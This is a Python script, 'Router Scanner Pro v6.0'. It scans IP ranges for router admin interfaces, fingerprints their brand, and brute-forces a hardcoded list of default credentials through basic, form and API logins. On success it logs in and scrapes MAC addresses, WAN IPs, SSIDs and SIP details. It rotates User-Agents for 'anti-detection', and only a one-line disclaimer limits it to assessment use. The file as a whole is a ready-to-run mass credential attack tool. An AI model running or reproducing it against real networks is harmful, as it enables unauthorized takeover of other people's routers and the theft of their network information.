#!/usr/bin/env python3
"""
Router Scanner Pro - Professional Network Security Tool v6.0
Author: Network Security Engineer
Cross-platform: Windows, Linux, macOS
Advanced brand detection, false positive filtering, and admin verification
"""

import os
import sys
import json
import time
import signal
import random
import socket
import argparse
import threading
import re
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import warnings
warnings.filterwarnings('ignore')

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# Global variables
running = True
stats = {'targets_scanned': 0, 'login_pages_found': 0, 'vulnerable_routers': 0, 'start_time': None}

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ROUTER SCANNER PRO - v6.0                                ║
║              Advanced Brand Detection & False Positive Filtering             ║
║                                                                              ║
║  🔍 Smart Brand Detection  |  🚫 False Positive Filtering                  ║
║  🎯 Admin Verification     |  📊 Advanced Information Extraction            ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.YELLOW}                            [!] For Network Security Assessment Only [!]{Colors.END}
{Colors.WHITE}                              Follow the white rabbit... 🐰{Colors.END}
"""
    print(banner)

# Target credentials
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user")
]

# Common ports
COMMON_PORTS = [80, 8080, 443, 8443, 8000, 8081, 8888, 8090, 9000, 9090]

# User-Agent rotation for anti-detection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
]

# False positive indicators (VPN, Email, Social login pages)
FALSE_POSITIVE_INDICATORS = [
    # VPN indicators
    'vpn', 'openvpn', 'wireguard', 'ipsec', 'l2tp', 'pptp', 'fortinet', 'cisco anyconnect',
    'nordvpn', 'expressvpn', 'surfshark', 'protonvpn', 'tunnelbear', 'cyberghost',
    
    # Email/Social indicators
    'email', 'e-mail', 'gmail', 'yahoo', 'outlook', 'hotmail', 'mail',
    'microsoft', 'google', 'facebook', 'twitter', 'instagram', 'social',
    'cloud', 'office365', 'oauth', 'sso', 'single sign-on', 'account.live.com',
    'accounts.google.com', 'login.live.com', 'facebook.com', 'twitter.com',
    
    # Other non-router indicators
    'github', 'gitlab', 'bitbucket', 'slack', 'discord', 'telegram', 'whatsapp',
    'zoom', 'teams', 'skype', 'dropbox', 'onedrive', 'icloud', 'aws', 'azure'
]

# Advanced brand detection patterns
BRAND_PATTERNS = {
    'tp-link': {
        'content': ['tp-link', 'tplink', 'TP-LINK', 'TPLINK', 'archer', 'TL-', 'deco', 'omada'],
        'headers': ['tp-link', 'tplink'],
        'paths': ['/userRpm/LoginRpm.htm', '/cgi-bin/luci', '/admin', '/login', '/webpages/login.html'],
        'models': ['TL-', 'Archer', 'Deco', 'Omada']
    },
    'huawei': {
        'content': ['huawei', 'HUAWEI', 'HG', 'B593', 'E5186', 'HG8245', 'HG8240', 'HG8247', 'HG8240H'],
        'headers': ['huawei', 'HUAWEI'],
        'paths': ['/html/index.html', '/asp/login.asp', '/login.cgi', '/admin', '/cgi-bin/webproc'],
        'models': ['HG', 'B593', 'E5186', 'HG8245', 'HG8240', 'HG8247']
    },
    'zte': {
        'content': ['zte', 'ZTE', 'ZXHN', 'MF28G', 'F660', 'F670L', 'F601', 'F609', 'F612'],
        'headers': ['zte', 'ZTE'],
        'paths': ['/login.gch', '/start.gch', '/getpage.gch', '/admin', '/cgi-bin/webproc'],
        'models': ['ZXHN', 'MF28G', 'F660', 'F670L', 'F601', 'F609', 'F612']
    },
    'netgear': {
        'content': ['netgear', 'NETGEAR', 'WNDR', 'R7000', 'N600', 'WNR', 'AC', 'AX', 'Orbi'],
        'headers': ['netgear', 'NETGEAR'],
        'paths': ['/setup.cgi', '/genie.cgi', '/cgi-bin/', '/admin', '/login.htm'],
        'models': ['WNDR', 'R7000', 'N600', 'WNR', 'AC', 'AX', 'Orbi']
    },
    'linksys': {
        'content': ['linksys', 'LINKSYS', 'WRT', 'E1200', 'E2500', 'E3200', 'EA', 'Velop'],
        'headers': ['linksys', 'LINKSYS'],
        'paths': ['/cgi-bin/webproc', '/cgi-bin/webif', '/admin', '/login', '/setup.cgi'],
        'models': ['WRT', 'E1200', 'E2500', 'E3200', 'EA', 'Velop']
    },
    'd-link': {
        'content': ['d-link', 'D-LINK', 'DIR', 'DSL', 'DSL-', 'DAP', 'DGS', 'DCS'],
        'headers': ['d-link', 'D-LINK'],
        'paths': ['/login.php', '/login.asp', '/cgi-bin/login', '/admin', '/login.htm'],
        'models': ['DIR', 'DSL', 'DAP', 'DGS', 'DCS']
    },
    'asus': {
        'content': ['asus', 'ASUS', 'RT-', 'GT-', 'DSL-', 'RT-AC', 'RT-AX', 'ZenWiFi', 'AiMesh'],
        'headers': ['asus', 'ASUS'],
        'paths': ['/Main_Login.asp', '/Advanced_System_Content.asp', '/admin', '/login.asp'],
        'models': ['RT-', 'GT-', 'DSL-', 'RT-AC', 'RT-AX', 'ZenWiFi']
    },
    'fritzbox': {
        'content': ['fritz', 'fritzbox', 'FRITZ', 'AVM', 'Fritz!Box', 'FRITZ!Box'],
        'headers': ['fritz', 'fritzbox', 'FRITZ', 'AVM'],
        'paths': ['/cgi-bin/webcm', '/cgi-bin/firmwarecfg', '/admin', '/login.lua'],
        'models': ['FRITZ!Box', 'FRITZ!Repeater', 'FRITZ!Powerline']
    },
    'generic': {
        'content': [],
        'headers': [],
        'paths': ['/', '/admin', '/login', '/login.htm', '/admin.htm', '/index.html'],
        'models': []
    }
}

# Admin panel indicators
ADMIN_INDICATORS = [
    'dashboard', 'status', 'configuration', 'admin panel', 'control panel', 'welcome',
    'logout', 'log out', 'system information', 'device status', 'main menu',
    'router', 'gateway', 'modem', 'access point', 'network', 'wireless',
    'lan', 'wan', 'dhcp', 'nat', 'firewall', 'port forwarding', 'qos',
    'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart'
]

class RouterScannerPro:
    def __init__(self, targets, threads=1, timeout=8):
        self.targets = list(set(targets))  # Remove duplicates
        self.threads = threads
        self.timeout = timeout
        self.session = self.create_session()
        self.lock = threading.Lock()
        
    def create_session(self):
        session = requests.Session()
        retry_strategy = Retry(total=2, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=self.threads, pool_maxsize=self.threads)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Random User-Agent
        session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        return session
    
    def scan_ports_fast(self, ip):
        open_ports = []
        for port in COMMON_PORTS:
            if not running:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports
    
    def detect_router_brand_advanced(self, ip, port):
        """Advanced brand detection using multiple methods"""
        try:
            url = f"http://{ip}:{port}/"
            
            # Try multiple User-Agents for better detection
            for user_agent in random.sample(USER_AGENTS, 3):
                try:
                    headers = {'User-Agent': user_agent}
                    response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        headers_str = str(response.headers).lower()
                        
                        # Check each brand
                        for brand, patterns in BRAND_PATTERNS.items():
                            if brand == 'generic':
                                continue
                                
                            # Check content patterns
                            content_matches = sum(1 for pattern in patterns['content'] if pattern.lower() in content)
                            
                            # Check header patterns
                            header_matches = sum(1 for pattern in patterns['headers'] if pattern.lower() in headers_str)
                            
                            # Check server header
                            server_header = response.headers.get('Server', '').lower()
                            server_matches = sum(1 for pattern in patterns['headers'] if pattern.lower() in server_header)
                            
                            # If we have strong indicators, return this brand
                            if content_matches >= 2 or header_matches >= 1 or server_matches >= 1:
                                return brand, patterns
                        
                        # If no specific brand found, return generic
                        return 'generic', BRAND_PATTERNS['generic']
                        
                except:
                    continue
            
            return 'generic', BRAND_PATTERNS['generic']
            
        except:
            return 'generic', BRAND_PATTERNS['generic']
    
    def is_false_positive(self, content, url):
        """Check if this is a false positive (VPN, Email, Social login)"""
        content_lower = content.lower()
        url_lower = url.lower()
        
        # Check for false positive indicators
        for indicator in FALSE_POSITIVE_INDICATORS:
            if indicator in content_lower or indicator in url_lower:
                return True, indicator
        
        # Check for email-based login forms
        if '<input' in content_lower and 'email' in content_lower:
            return True, 'email-based login'
        
        # Check for social login buttons
        social_indicators = ['facebook', 'google', 'twitter', 'microsoft', 'apple', 'github']
        for social in social_indicators:
            if social in content_lower:
                return True, f'social login ({social})'
        
        return False, None
    
    def detect_authentication_type(self, url):
        """Detect authentication type for a specific URL"""
        try:
            # Use random User-Agent
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code == 401:
                return 'http_basic', response
            
            content = response.text.lower()
            headers_str = str(response.headers).lower()
            
            # Check for false positives first
            is_fp, fp_reason = self.is_false_positive(content, url)
            if is_fp:
                return f'false_positive_{fp_reason}', response
            
            # Check for login forms
            if '<form' in content and ('password' in content or 'username' in content):
                return 'form_based', response
            
            # Check for API endpoints
            if any(keyword in content for keyword in ['api', 'json', 'rest', 'ajax']):
                return 'api_based', response
            
            # Check for redirect patterns
            if response.history or 'location' in headers_str:
                return 'redirect_based', response
            
            return None, response
            
        except:
            return None, None
    
    def test_http_basic_auth(self, ip, port, path, username, password):
        """Test HTTP Basic Authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            credentials = f"{username}:{password}"
            encoded_credentials = base64.b64encode(credentials.encode()).decode()
            
            headers = {
                'Authorization': f'Basic {encoded_credentials}',
                'User-Agent': random.choice(USER_AGENTS)
            }
            
            response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code != 401 and response.status_code == 200 and len(response.text) > 500:
                return True, response.url
            
            return False, None
            
        except:
            return False, None
    
    def test_form_based_auth(self, ip, port, path, username, password):
        """Test form-based authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            
            # Try different form field combinations
            form_data_variations = [
                {'username': username, 'password': password},
                {'user': username, 'pass': password},
                {'login': username, 'passwd': password},
                {'admin': username, 'admin': password},
                {'name': username, 'pwd': password},
                {'username': username, 'password': password, 'login': 'Login'},
                {'user': username, 'pass': password, 'submit': 'Login'},
                {'username': username, 'password': password, 'action': 'login'}
            ]
            
            for form_data in form_data_variations:
                try:
                    headers = {'User-Agent': random.choice(USER_AGENTS)}
                    response = self.session.post(url, data=form_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
                    
                    if response.status_code == 200 and len(response.text) > 1000:
                        content = response.text.lower()
                        
                        # Check for admin panel indicators
                        admin_score = sum(1 for indicator in ADMIN_INDICATORS if indicator in content)
                        
                        # Check for failure indicators
                        failure_indicators = [
                            'invalid', 'incorrect', 'failed', 'error', 'denied',
                            'wrong', 'login', 'authentication', 'access denied'
                        ]
                        failure_score = sum(1 for indicator in failure_indicators if indicator in content)
                        
                        # If admin score is higher than failure score, consider it successful
                        if admin_score > failure_score and admin_score >= 3:
                            return True, response.url
                            
                except:
                    continue
            
            return False, None
            
        except:
            return False, None
    
    def test_api_based_auth(self, ip, port, path, username, password):
        """Test API-based authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            
            # Try JSON payload
            json_data = {
                'username': username,
                'password': password,
                'user': username,
                'pass': password
            }
            
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': random.choice(USER_AGENTS)
            }
            
            response = self.session.post(url, json=json_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    if 'success' in str(json_response).lower() or 'token' in str(json_response).lower():
                        return True, url
                except:
                    pass
            
            # Try form data
            form_data = {'username': username, 'password': password}
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = self.session.post(url, data=form_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code == 200 and len(response.text) > 100:
                content = response.text.lower()
                if 'success' in content or 'token' in content or 'authenticated' in content:
                    return True, url
            
            return False, None
            
        except:
            return False, None
    
    def test_credentials(self, ip, port, path, username, password, auth_type):
        """Test credentials based on authentication type"""
        if auth_type == 'http_basic':
            return self.test_http_basic_auth(ip, port, path, username, password)
        elif auth_type == 'form_based':
            return self.test_form_based_auth(ip, port, path, username, password)
        elif auth_type == 'api_based':
            return self.test_api_based_auth(ip, port, path, username, password)
        else:
            return self.test_form_based_auth(ip, port, path, username, password)
    
    def verify_admin_access(self, admin_url, username, password):
        """Verify admin access and extract router information"""
        try:
            # Re-login to ensure session is active
            login_data = {'username': username, 'password': password}
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            self.session.post(admin_url, data=login_data, headers=headers, verify=False)
            
            # Get admin page
            response = self.session.get(admin_url, headers=headers, verify=False)
            content = response.text.lower()
            
            # Check for admin panel indicators
            admin_score = sum(1 for indicator in ADMIN_INDICATORS if indicator in content)
            
            if admin_score >= 3:
                return True, self.extract_router_info(content)
            else:
                return False, {}
                
        except:
            return False, {}
    
    def extract_router_info(self, content):
        """Extract comprehensive router information"""
        info = {}
        
        # Extract MAC address
        mac_patterns = [
            r'mac[^:]*:?\s*([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})',
            r'([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})',
            r'physical.*?address[^:]*:?\s*([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})'
        ]
        info['mac_address'] = self.extract_pattern(content, mac_patterns)
        
        # Extract firmware version
        firmware_patterns = [
            r'firmware[^:]*:?\s*([v\d\.\-]+)',
            r'version[^:]*:?\s*([v\d\.\-]+)',
            r'firmware.*?(\d+\.\d+\.\d+)',
            r'software[^:]*:?\s*([v\d\.\-]+)'
        ]
        info['firmware_version'] = self.extract_pattern(content, firmware_patterns)
        
        # Extract model
        model_patterns = [
            r'model[^:]*:?\s*([A-Z0-9\-_]+)',
            r'device[^:]*:?\s*([A-Z0-9\-_]+)',
            r'product[^:]*:?\s*([A-Z0-9\-_]+)',
            r'type[^:]*:?\s*([A-Z0-9\-_]+)'
        ]
        info['model'] = self.extract_pattern(content, model_patterns)
        
        # Extract WAN IP
        wan_ip_patterns = [
            r'wan.*?(\d+\.\d+\.\d+\.\d+)',
            r'external.*?(\d+\.\d+\.\d+\.\d+)',
            r'internet.*?(\d+\.\d+\.\d+\.\d+)',
            r'public.*?(\d+\.\d+\.\d+\.\d+)'
        ]
        info['wan_ip'] = self.extract_pattern(content, wan_ip_patterns)
        
        # Extract SSID
        ssid_patterns = [
            r'ssid[^:]*:?\s*([A-Za-z0-9\-_]+)',
            r'network.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
            r'wireless.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
            r'wifi.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)'
        ]
        info['ssid'] = self.extract_pattern(content, ssid_patterns)
        
        # Extract SIP information
        sip_patterns = [
            r'sip[^:]*:?\s*([A-Za-z0-9@\.\-_]+)',
            r'voip[^:]*:?\s*([A-Za-z0-9@\.\-_]+)',
            r'phone[^:]*:?\s*([A-Za-z0-9@\.\-_]+)'
        ]
        info['sip_info'] = self.extract_pattern(content, sip_patterns)
        
        # Extract uptime
        uptime_patterns = [
            r'uptime[^:]*:?\s*([0-9]+[dhms\s]+)',
            r'running[^:]*:?\s*([0-9]+[dhms\s]+)',
            r'online[^:]*:?\s*([0-9]+[dhms\s]+)'
        ]
        info['uptime'] = self.extract_pattern(content, uptime_patterns)
        
        # Extract connection type
        connection_patterns = [
            r'connection[^:]*:?\s*([A-Za-z0-9\-_]+)',
            r'type[^:]*:?\s*([A-Za-z0-9\-_]+)',
            r'mode[^:]*:?\s*([A-Za-z0-9\-_]+)'
        ]
        info['connection_type'] = self.extract_pattern(content, connection_patterns)
        
        return info
    
    def extract_pattern(self, content, patterns):
        """Extract information using regex patterns"""
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        return "Unknown"
    
    def scan_single_target(self, ip):
        """Scan a single target with organized workflow"""
        result = {'ip': ip, 'ports': [], 'login_pages': [], 'vulnerabilities': []}
        
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[*] SCANNING TARGET: {ip}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            # Phase 1: Port scanning
            print(f"{Colors.YELLOW}[1/4] Port Scanning...{Colors.END}")
            open_ports = self.scan_ports_fast(ip)
            result['ports'] = open_ports
            
            if not open_ports:
                print(f"{Colors.RED}[!] No open ports found{Colors.END}")
                return result
            
            print(f"{Colors.GREEN}[+] Found {len(open_ports)} open ports: {open_ports}{Colors.END}")
            
            # Phase 2: Brand detection and login page discovery
            print(f"{Colors.YELLOW}[2/4] Brand Detection & Login Discovery...{Colors.END}")
            
            for port in open_ports:
                if not running:
                    break
                
                # Advanced brand detection
                brand, brand_patterns = self.detect_router_brand_advanced(ip, port)
                print(f"{Colors.BLUE}[*] Detected brand: {brand.upper()}{Colors.END}")
                
                # Get priority paths based on brand
                priority_paths = brand_patterns['paths'] + BRAND_PATTERNS['generic']['paths']
                
                # Test paths in priority order
                login_found = False
                for path in priority_paths:
                    if not running or login_found:
                        break
                    
                    url = f"http://{ip}:{port}{path}"
                    auth_type, response = self.detect_authentication_type(url)
                    
                    if auth_type and not auth_type.startswith('false_positive'):
                        print(f"{Colors.GREEN}[+] LOGIN PAGE FOUND: {url} ({auth_type}){Colors.END}")
                        
                        login_info = {
                            'url': url,
                            'port': port,
                            'path': path,
                            'auth_type': auth_type,
                            'brand': brand
                        }
                        result['login_pages'].append(login_info)
                        login_found = True
                        
                        # Phase 3: Brute force attack
                        print(f"{Colors.YELLOW}[3/4] Brute Force Attack...{Colors.END}")
                        
                        for username, password in TARGET_CREDENTIALS:
                            if not running:
                                break
                            
                            print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
                            
                            success, admin_url = self.test_credentials(ip, port, path, username, password, auth_type)
                            
                            if success:
                                print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                                print(f"{Colors.GREEN}[+] Admin URL: {admin_url}{Colors.END}")
                                
                                # Phase 4: Admin verification and information extraction
                                print(f"{Colors.YELLOW}[4/4] Admin Verification & Information Extraction...{Colors.END}")
                                
                                verified, router_info = self.verify_admin_access(admin_url, username, password)
                                
                                if verified:
                                    print(f"{Colors.GREEN}[+] Admin access verified!{Colors.END}")
                                    
                                    # Display extracted information
                                    for key, value in router_info.items():
                                        if value and value != "Unknown":
                                            print(f"{Colors.MAGENTA}[+] {key.replace('_', ' ').title()}: {value}{Colors.END}")
                                    
                                    vulnerability = {
                                        'type': 'Default Credentials',
                                        'credentials': f"{username}:{password}",
                                        'admin_url': admin_url,
                                        'auth_type': auth_type,
                                        'router_info': router_info,
                                        'verified': True
                                    }
                                    result['vulnerabilities'].append(vulnerability)
                                    
                                    with self.lock:
                                        stats['vulnerable_routers'] += 1
                                    
                                    break
                                else:
                                    print(f"{Colors.RED}[-] Admin access verification failed{Colors.END}")
                            else:
                                print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                        
                        if not result['vulnerabilities']:
                            print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
                    elif auth_type and auth_type.startswith('false_positive'):
                        print(f"{Colors.YELLOW}[!] False positive detected: {auth_type.replace('false_positive_', '')}{Colors.END}")
            
            # Update stats
            with self.lock:
                stats['targets_scanned'] += 1
                if result['login_pages']:
                    stats['login_pages_found'] += 1
            
            print(f"{Colors.GREEN}[+] Target {ip} scan completed{Colors.END}")
            return result
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error scanning {ip}: {e}{Colors.END}")
            return result
    
    def run_scan(self):
        print(f"{Colors.GREEN}[+] Starting organized scan of {len(self.targets)} targets{Colors.END}")
        print(f"{Colors.YELLOW}[*] Target credentials: {', '.join([f'{u}:{p}' for u, p in TARGET_CREDENTIALS])}{Colors.END}")
        print(f"{Colors.CYAN}[*] Scanning ports: {', '.join(map(str, COMMON_PORTS))}{Colors.END}")
        print(f"{Colors.BLUE}[*] Advanced brand detection with false positive filtering{Colors.END}")
        print(f"{Colors.MAGENTA}[*] Organized workflow: Ports → Brand → Login → Brute Force → Admin Verification{Colors.END}")
        print("-" * 80)
        
        all_results = []
        
        # Process targets one by one for organized output
        for i, ip in enumerate(self.targets):
            if not running:
                break
            
            result = self.scan_single_target(ip)
            if result:
                all_results.append(result)
            
            # Update progress
            completed = i + 1
            progress = (completed / len(self.targets)) * 100
            
            print(f"{Colors.MAGENTA}[*] Progress: {completed}/{len(self.targets)} ({progress:.1f}%) - "
                  f"Login pages: {stats['login_pages_found']}, Vulnerable: {stats['vulnerable_routers']}{Colors.END}")
        
        return all_results

def parse_targets(target_input):
    targets = []
    
    if '/' in target_input:  # CIDR
        import ipaddress
        network = ipaddress.IPv4Network(target_input, strict=False)
        targets = [str(ip) for ip in network.hosts()]
    elif '-' in target_input:  # IP range
        start_ip, end_ip = target_input.split('-')
        start = list(map(int, start_ip.split('.')))
        end = list(map(int, end_ip.split('.')))
        
        for a in range(start[0], end[0] + 1):
            for b in range(start[1], end[1] + 1):
                for c in range(start[2], end[2] + 1):
                    for d in range(start[3], end[3] + 1):
                        targets.append(f"{a}.{b}.{c}.{d}")
    elif target_input.endswith('.txt'):  # File
        try:
            with open(target_input, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found: {target_input}{Colors.END}")
            return []
    else:  # Single IP
        targets = [target_input]
    
    return targets

def main():
    parser = argparse.ArgumentParser(description="Router Scanner Pro v6.0 - Advanced Brand Detection & False Positive Filtering")
    parser.add_argument('-t', '--targets', required=True, help='Target IP(s): single IP, CIDR, range, or file')
    parser.add_argument('-T', '--threads', type=int, default=1, help='Number of threads (default: 1 for organized output)')
    parser.add_argument('--timeout', type=int, default=8, help='Request timeout in seconds (default: 8)')
    
    args = parser.parse_args()
    
    clear_screen()
    print_banner()
    
    targets = parse_targets(args.targets)
    if not targets:
        print(f"{Colors.RED}[!] No valid targets found{Colors.END}")
        return
    
    print(f"{Colors.GREEN}[+] Loaded {len(targets)} targets{Colors.END}")
    
    scanner = RouterScannerPro(targets, args.threads, args.timeout)
    stats['start_time'] = time.time()
    
    try:
        results = scanner.run_scan()
        
        if results:
            total_time = time.time() - stats['start_time']
            
            print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.GREEN}[+] SCAN COMPLETE!{Colors.END}")
            print(f"{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.YELLOW}[*] Summary:{Colors.END}")
            print(f"  - Total targets scanned: {len(results)}")
            print(f"  - Login pages found: {stats['login_pages_found']}")
            print(f"  - Vulnerable routers: {stats['vulnerable_routers']}")
            print(f"  - Scan duration: {total_time:.1f} seconds")
            print(f"  - Average speed: {len(results)/total_time:.1f} targets/second")
            print(f"{Colors.BLUE}[*] Advanced detection and verification completed successfully{Colors.END}")
            
        else:
            print(f"{Colors.RED}[!] No results to report{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {e}{Colors.END}")

if __name__ == "__main__":
    main()